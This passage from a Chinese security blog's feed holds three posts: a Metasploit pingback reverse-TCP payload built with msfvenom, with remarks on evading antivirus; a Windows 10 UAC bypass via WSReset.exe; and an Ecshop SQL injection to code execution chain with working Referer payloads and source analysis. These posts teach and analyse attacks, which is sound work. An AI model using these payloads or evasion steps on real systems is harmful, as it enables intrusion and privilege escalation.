class="literal">true</span>, <span class="string">"How many additional successful pingbacks"</span>, <span class="number">0</span>]),</span><br><span class="line">        Msf::OptInt.new(<span class="string">'PingbackSleep'</span>, [<span class="literal">true</span>, <span class="string">"Time (in seconds) to sleep between pingbacks"</span>, <span class="number">30</span>])</span><br><span class="line">      ], <span class="keyword">self</span>.<span class="keyword">class</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><ul><li>PingbackRetries  - pingback的次数</li><li>PingbackSleep - pinigback的时间间隔</li></ul><p>我们利用 <code>Msfvenom</code> 生成一个 <code>windows/x64/pingback_reverse_tcp</code> 的exe木马</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/pingback_reverse_tcp -f exe -o patrilic.exe LHOST=<span class="number">192.168</span>.<span class="number">1.107</span> LPORT=<span class="number">4445</span> EXITFUNC=thread PINGBACKRETRIES=<span class="number">10</span> PINGBACKSLEEP=<span class="number">5</span></span><br></pre></td></tr></table></figure><p>然后在目标机器上执行时：</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567698698752-8e60bbfb-8134-4cae-a909-80499d4ab5c2.png" alt="image.png"><br>只会返回UUID<br><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567698945771-f65f647a-3285-42e1-863e-29555f64cca5.png" alt="image.png"></p><p>然后目标机器上并没有产生任何的交互式shell，同时使用 <code>Wireshark</code> 也只能捕获到16byte的UUID值</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567699063357-40b97628-fdfa-4c67-951a-546ce62b1f6e.png" alt="image.png"></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>这次更新的pingback payload，已经感觉是最小化的攻击载荷了，而且特征也并不明显，只是一串随机的UUID值而已，感觉用来验证漏洞还是挺不错的，然后后面再办法去掉exp特征，使用另外的方式来获得交互式shell或者直接执行命令云云.. 当然，msf直接生成的程序特征还是挺明显的，还是需要进行免杀，不过由于这个payload并没有进行起敏感进程，所以还是比较好免杀的。</p><p>shellcode随便加密搞了下，静态还行，但是动态估计也没啥2333毕竟也没有危险进程，只是开了个socket</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567701851264-0e1de3de-9aec-49dd-99cc-278ba2685e22.png#align=left&amp;display=inline&amp;height=937&amp;name=image.png&amp;originHeight=1874&amp;originWidth=3358&amp;size=497343&amp;status=done&amp;width=1679" alt="image.png"></p><p>然后进程开起来的话，找了个360的机子试了下，没啥问题</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258139/1567701981644-609e99b8-e943-4859-96fb-00c8d6ffa46e.png" alt="image1.png"></p><p>不过特征估计也快普及了，感觉思路挺好的，学习了～</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a name=&quot;JSO7R&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;文章首发于先知社区
      
    
    </summary>
    
      <category term="Red-Team Tricks" scheme="http://patrilic.top/categories/Red-Team-Tricks/"/>
    
    
      <category term="metasploit" scheme="http://patrilic.top/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>Windows10 BypassUAC with WSReset.exe</title>
    <link href="http://patrilic.top/2019/08/29/Windows10%20BypassUAC%20with%20WSReset.exe/"/>
    <id>http://patrilic.top/2019/08/29/Windows10 BypassUAC with WSReset.exe/</id>
    <published>2019-08-29T15:51:00.000Z</published>
    <updated>2019-08-30T00:49:55.667Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>Time: 2019-08-29 23:51:00<br><img src="/wallpaper/63740442.png" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><a href="https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html" target="_blank" rel="noopener">https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html</a></p><p>利用<code>WSReset.exe</code>进行bypassUAC。</p><p>为什么只限于Win10呢，因为这个位于<code>C:\WINDWOS\System32</code> 目录下的程序，是微软商店的一个工具<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/E969032A-4448-40D0-9389-395E1D9502AA.png" alt="6f262c0c97c3dfb682f04fd809cf60e3"></p><h2 id="0x01-Bypass"><a href="#0x01-Bypass" class="headerlink" title="0x01 Bypass"></a>0x01 Bypass</h2><p>这里原作者自己编写了脚本和工具：<br><a href="https://github.com/sailay1996/UAC_bypass_windows_store" target="_blank" rel="noopener">https://github.com/sailay1996/UAC_bypass_windows_store</a></p><p>首先使用<code>UAC.bat</code><br><img src="/Windows10 BypassUAC with WSReset.exe.resources/CB964BB5-BB3A-4D53-A67C-6E6454849741.png" alt="ec35f36d2e88012ed02af35cbc09e1f0"></p><p>创建一个带空格字符的目录，然后把WSReset扔进去</p><p>接着运行<code>uac_bypass.exe</code><br><img src="/Windows10 BypassUAC with WSReset.exe.resources/8FF6C343-6736-4498-A988-5766929E0EFD.png" alt="c4add2018e585c2ca68544c6acabb04e"></p><p>调用DLL，弹出对话框<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/A6D6CAA5-A74F-4965-B791-F1E7FCDDC7B7.png" alt="605ad7a9df01dc55e5392b562a029677"><br>主要就是因为这个👉<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/32B27C2A-82C9-4934-9CCD-3051DBEAC8A7.png" alt="589206bf8c6b67a17a09253985b8e353"></p><p>然后会弹出一个管理员的CMD<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/B375540E-97FA-4751-8A24-9A0385A5341F.png" alt="4c6538e20548f14902cfd64df18f0cb6"></p><p>但是有一个问题是，虚拟机一直保持高速下载<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/92007680-2629-45ED-AE96-E6C8863511D2.png" alt="f1748df2675213d7fa216762acb9be4c"></p><p>感觉程序里有些东西..后面无聊再分析吧。</p><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>bypassUAC方法多种多样，看这个只是因为好玩，用微软没啥用的应用商店的组件，其实本质上还是DLL劫持2333</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;Time: 2019-08-29 23:51:00&lt;br&gt;&lt;img src=&quot;/wallpaper/63740442.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-前言&quot;
      
    
    </summary>
    
      <category term="BypassUac" scheme="http://patrilic.top/categories/BypassUac/"/>
    
    
      <category term="内网渗透" scheme="http://patrilic.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Ecshop 2.x/3.x SQL注入 + 代码执行</title>
    <link href="http://patrilic.top/2019/08/27/Ecshop%202.x%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://patrilic.top/2019/08/27/Ecshop 2.x 代码执行/</id>
    <published>2019-08-26T16:03:02.000Z</published>
    <updated>2019-08-27T18:00:58.699Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-8-27 00:03:02<br><img src="/wallpaper/[60268880.jpg" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>很多QB的Passer6y给我发了个长得奇奇怪怪的payload，想了下，好像是Ecshop 2.x的RCE，昨年看到就想分析，一直搞忘了.. 今晚补上！<br>PS: 速度与激情真的好看，Dwayne Johnson太帅ahhhh</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>使用phpstudy 2018 搭建</p><blockquote><p>分析工具： PhpStorm<br>php 5.3.29 nts + Apache<br>MySQL 5.5.3</p></blockquote><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>漏洞发生在user.php 的 Referer处<br>payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">72</span>:<span class="string">"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -"</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;i:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/Ecshop 2.x 代码执行.resources/0BD49A51-AEE2-4D13-A91A-9313BB129B0C.png" alt="e21d6b60329ce5b0f5a9129ba3da49b6"></p><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>其实是SQL注入的进一步利用，同样是在user.php<br>payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">110</span>:<span class="string">"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -"</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;s:<span class="number">4</span>:<span class="string">"' /*"</span>;&#125;<span class="number">554</span>fcae493e564ee0dc75bdf2ebf94ca</span><br></pre></td></tr></table></figure></p><p><img src="/Ecshop 2.x 代码执行.resources/AF83B1F8-8389-4E44-AB11-AE46841695E0.png" alt="63cf020521a24682a91cb6aae5e91fbb"></p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><h3 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h3><p>直接看漏洞发生点：<br>既然payload是从Referer传进来的，那么就直接看<code>[&#39;HTTP_REFERER&#39;]</code><br><strong>user.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 用户登录界面 */</span></span><br><span class="line"><span class="keyword">elseif</span> ($action == <span class="string">'login'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($back_act))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($back_act) &amp;&amp; <span class="keyword">isset</span>($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            $back_act = strpos($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>], <span class="string">'user.php'</span>) ? <span class="string">'./index.php'</span> : $GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $back_act = <span class="string">'user.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $captcha = intval($_CFG[<span class="string">'captcha'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (($captcha &amp; CAPTCHA_LOGIN) &amp;&amp; (!($captcha &amp; CAPTCHA_LOGIN_FAIL) || (($captcha &amp; CAPTCHA_LOGIN_FAIL) &amp;&amp; $_SESSION[<span class="string">'login_fail'</span>] &gt; <span class="number">2</span>)) &amp;&amp; gd_version() &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'enabled_captcha'</span>, <span class="number">1</span>);</span><br><span class="line">        $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'rand'</span>, mt_rand());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $smarty-&gt;assign(<span class="string">'back_act'</span>, $back_act);</span><br><span class="line">    $smarty-&gt;display(<span class="string">'user_passport.dwt'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>$back_act</code> 从<code>HTTP_REFERER</code>那里拿到值，然后<code>$smarty-&gt;assign(&#39;back_act&#39;, $back_act);</code><br>将<code>$back_act</code>作为参数，调用<code>assign</code>函数<br><img src="/Ecshop 2.x 代码执行.resources/AE65DFBE-6628-45D3-9296-922A907441D6.png" alt="754c7a3810743fdf7d2cf06aeea33529"><br>实际调用的是<code>/includes/cls_template.php</code>下的<code>assign</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assign</span><span class="params">($tpl_var, $value = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($tpl_var))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($tpl_var <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ($key != <span class="string">''</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;_var[$key] = $val;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($tpl_var != <span class="string">''</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_var[$tpl_var] = $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以其实是注册了模板变量，然后回到login处，调用了display函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_seterror++;</span><br><span class="line">        error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_checkfile = <span class="keyword">false</span>;</span><br><span class="line">        $out = <span class="keyword">$this</span>-&gt;fetch($filename, $cache_id);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strpos($out, <span class="keyword">$this</span>-&gt;_echash) !== <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $k = explode(<span class="keyword">$this</span>-&gt;_echash, $out);</span><br><span class="line">            <span class="keyword">foreach</span> ($k <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (($key % <span class="number">2</span>) == <span class="number">1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    $k[$key] = <span class="keyword">$this</span>-&gt;insert_mod($val);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            $out = implode(<span class="string">''</span>, $k);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting(<span class="keyword">$this</span>-&gt;_errorlevel);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_seterror--;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $out;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>filename便是传入的<code>user_passport.dwt</code>，这里调用fetch处理dwt文件，转到fetch函数，使用了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$out = <span class="keyword">$this</span>-&gt;make_compiled($filename);</span><br></pre></td></tr></table></figure></p><p>然后使用make_compiled函数进行编译<br><code>user_passport.dwt</code>里面存在{$back_act}变量<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;td align=<span class="string">"left"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"act"</span> value=<span class="string">"act_login"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"back_act"</span> value=<span class="string">"&#123;$back_act&#125;"</span> /&gt;</span><br><span class="line">&lt;input type="submit" name="submit" value="" class="us_Submit" /&gt;</span><br><span class="line">&lt;/td&gt;</span><br></pre></td></tr></table></figure></p><p>display函数里存在一个if判断，如果<code>$out</code>是否存在<code>$this-&gt;_echash</code>，而这个hash值，其实是一个静态变量<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $_echash = <span class="string">'554fcae493e564ee0dc75bdf2ebf94ca'</span>;</span><br></pre></td></tr></table></figure></p><p>我们跟进这个if判断，如果存在的话，从hash处分割，然后把<code>$k</code>交给<code>$this-&gt;insert_mod($val)</code>去处理<br>继续跟<code>insert_mod()</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_mod</span><span class="params">($name)</span> // 处理动态内容</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($fun, $para) = explode(<span class="string">'|'</span>, $name);</span><br><span class="line">        $para = unserialize($para);</span><br><span class="line">        $fun = <span class="string">'insert_'</span> . $fun;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $fun($para);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这里先用<code>|</code>分割，进行反序列化操作，然后再使用<code>insert_</code>拼接，所以其实，该函数名和参数均可控<br>就是需要寻找一个<code>insert_</code>开头的函数。</p><p>最后，<code>/includes/lib_insert.php</code>里存在一个<code>insert_ads</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_ads</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $static_res = <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line">    $time = gmtime();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($arr[<span class="string">'num'</span>]) &amp;&amp; $arr[<span class="string">'num'</span>] != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql  = <span class="string">'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '</span> .</span><br><span class="line">                    <span class="string">'p.ad_height, p.position_style, RAND() AS rnd '</span> .</span><br><span class="line">                <span class="string">'FROM '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad'</span>) . <span class="string">' AS a '</span>.</span><br><span class="line">                <span class="string">'LEFT JOIN '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad_position'</span>) . <span class="string">' AS p ON a.position_id = p.position_id '</span> .</span><br><span class="line">                <span class="string">"WHERE enabled = 1 AND start_time &lt;= '"</span> . $time . <span class="string">"' AND end_time &gt;= '"</span> . $time . <span class="string">"' "</span>.</span><br><span class="line">                    <span class="string">"AND a.position_id = '"</span> . $arr[<span class="string">'id'</span>] . <span class="string">"' "</span> .</span><br><span class="line">                <span class="string">'ORDER BY rnd LIMIT '</span> . $arr[<span class="string">'num'</span>];</span><br><span class="line">        $res = $GLOBALS[<span class="string">'db'</span>]-&gt;GetAll($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($static_res[$arr[<span class="string">'id'</span>]] === <span class="keyword">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $sql  = <span class="string">'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '</span>.</span><br><span class="line">                        <span class="string">'p.ad_height, p.position_style, RAND() AS rnd '</span> .</span><br><span class="line">                    <span class="string">'FROM '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad'</span>) . <span class="string">' AS a '</span>.</span><br><span class="line">                    <span class="string">'LEFT JOIN '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad_position'</span>) . <span class="string">' AS p ON a.position_id = p.position_id '</span> .</span><br><span class="line">                    <span class="string">"WHERE enabled = 1 AND a.position_id = '"</span> . $arr[<span class="string">'id'</span>] .</span><br><span class="line">                        <span class="string">"' AND start_time &lt;= '"</span> . $time . <span class="string">"' AND end_time &gt;= '"</span> . $time . <span class="string">"' "</span> .</span><br><span class="line">                    <span class="string">'ORDER BY rnd LIMIT 1'</span>;</span><br><span class="line">            $static_res[$arr[<span class="string">'id'</span>]] = $GLOBALS[<span class="string">'db'</span>]-&gt;GetAll($sql);</span><br><span class="line">        &#125;</span><br><span class="line">        $res = $static_res[$arr[<span class="string">'id'</span>]];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这里我们的<code>$arr</code>数组，是完全可控的，就造成了一个SQL注入漏洞<br>所以攻击链就出来了</p><blockquote><p>user.php （获取$back_act）-&gt; assign() 注册变量 -&gt; display() 输出模版 -&gt; 根据hash，进入insert_mod() -&gt; 最后调用insert_ads() 完成注入</p></blockquote><p>payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REFERER: hash + $fun | serialize(<span class="keyword">array</span>(<span class="string">"num"</span>=&gt;sqlpayload,<span class="string">"id"</span>=&gt;<span class="number">1</span>))</span><br></pre></td></tr></table></figure></p><h3 id="代码执行-1"><a href="#代码执行-1" class="headerlink" title="代码执行"></a>代码执行</h3><p>漏洞点同样是这个SQL注入引起，主要是因为<code>insert_ads()</code>函数后面又引入了一个fetch<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$position_style = <span class="string">'str:'</span> . $position_style;</span><br><span class="line"></span><br><span class="line">    $need_cache = $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching;</span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'ads'</span>, $ads);</span><br><span class="line">    $val = $GLOBALS[<span class="string">'smarty'</span>]-&gt;fetch($position_style);</span><br><span class="line"></span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = $need_cache;</span><br></pre></td></tr></table></figure></p><p>这里将<code>$position_style</code>进行fetch，往上看<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($res <span class="keyword">AS</span> $row)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($row[<span class="string">'position_id'</span>] != $arr[<span class="string">'id'</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $position_style = $row[<span class="string">'position_style'</span>];</span><br></pre></td></tr></table></figure></p><p><code>$position_style</code>是从SQL结果集中取的，所以，我们应该可以控制<br>代码执行点在fetch函数里<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_seterror)</span><br><span class="line">        &#123;</span><br><span class="line">            error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_seterror++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strncmp($filename,<span class="string">'str:'</span>, <span class="number">4</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $out = <span class="keyword">$this</span>-&gt;_eval(<span class="keyword">$this</span>-&gt;fetch_str(substr($filename, <span class="number">4</span>)));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>这里之前因为<code>$position_style</code>已经经过了<br><code>$position_style = &#39;str:&#39; . $position_style;</code>的处理<br>所以<code>strncmp($filename,&#39;str:&#39;, 4) == 0</code>肯定是为真的，所以会直接执行代码.<br>但是需要满足<code>fetch_str</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch_str</span><span class="params">($source)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!defined(<span class="string">'ECS_ADMIN'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            $source = <span class="keyword">$this</span>-&gt;smarty_prefilter_preCompile($source);</span><br><span class="line">        &#125;</span><br><span class="line">        $source=preg_replace(<span class="string">"/([^a-zA-Z0-9_]&#123;1,1&#125;)+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\()/is"</span>, <span class="string">""</span>, $source);</span><br><span class="line">        <span class="keyword">if</span>(preg_match_all(<span 